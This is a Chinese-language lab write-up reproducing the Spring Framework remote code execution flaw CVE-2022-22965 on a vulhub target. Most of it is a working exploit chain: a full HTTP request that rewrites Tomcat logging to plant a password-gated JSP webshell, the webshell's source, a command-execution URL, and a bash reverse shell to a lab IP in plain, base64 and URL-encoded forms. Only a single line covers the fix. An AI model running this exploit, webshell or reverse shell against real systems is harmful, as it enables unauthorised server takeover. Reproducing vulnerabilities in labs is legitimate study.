# Spring Framework远程代码执行（CVE-2022-22965）

### 0x00 简介

2022年3月 Spring Framework 爆出严重级别的安全漏洞，在 JDK 9 及以上版本环境下，可以利用此漏洞在未授权的情况下在目标系统上写入恶意程序从而远程执行任意代码。Spring Framework 官方很快发布了5.3.18以及5.2.20修复了该漏洞。该 CVE-2022-22965 漏洞是因为在 Java 9的环境下，引入了 class.module.classLoader，导致了 CVE-2010-1622 漏洞补丁的绕过，从而造成这个漏洞。

利用条件：

- JDK版本：JDK 9及以上版本
- 受影响组件：直接或者间接地使⽤了Spring-beans包（Spring boot等框架都使用了）
- 受影响的版本：Spring Framework < 5.3.18 ，Spring Framework < 5.2.20 及衍生版本
- 部署方式：使用war包部署于tomcat

### 0x01 环境搭建

使用vulhub进行环境搭建`spring/CVE-2022-22965`

服务器启动后，浏览` http://your-ip:8080/?name=Bob&age=25` 查看示例页面。

![image-20230413150401956](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230413150401956.png)

### 0x02 POC/EXP脚本

cve_2022_22965_rce.py: `https://github.com/lcyunkong/pochub/blob/main/pochub/poc_list/web/Spring/cve_2022_22965_rce.py`

```python
# 利用：
# 在代码最后传入目标url即可，实例：
vuln_exploit_start("http://192.168.12.130:8080")
```

### 0x03 复现步骤

1、使用BrupSuite代理浏览器，访问靶场并进行拦截，将拦截后的请求放于repeater模块中，使用下面的POC更改 Apache Tomcat 中的日志记录配置并将日志写入 JSP 文件：

```
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
suffix: %>//
c1: Runtime
c2: <%
DNT: 1

```

![image-20230413154259807](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230413154259807.png)

2、然后，就可以使用JSP webshell成功执行任意命令

```
http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=id
```

![image-20230413154354656](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230413154354656.png)

3、AccessLogValve输出的日志实际内容其实是下面的样子，一个JSP webshell。

```jsp
<%
if("j".equals(request.getParameter("pwd"))){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
}
%>//
```

4、通过webshell获取shell

```shell
bash -i >& /dev/tcp/192.168.12.152/5555 0>&1

# base64编码
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyLjE1Mi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}

# URL编码
bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEyLjE1Mi81NTU1IDA%2BJjE%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D
```

访问一下链接，即可获取shell

```
http://192.168.12.130:8080/tomcatwar.jsp?pwd=j&cmd=bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjEyLjE1Mi81NTU1IDA%2BJjE%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D
```

![image-20230413155401380](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230413155401380.png)

### 0x04 修复方案

1、更新spring-beans版本，官方已经发布了补丁，在最新版本v5.3.18和v5.2.20中完成了漏洞的修复。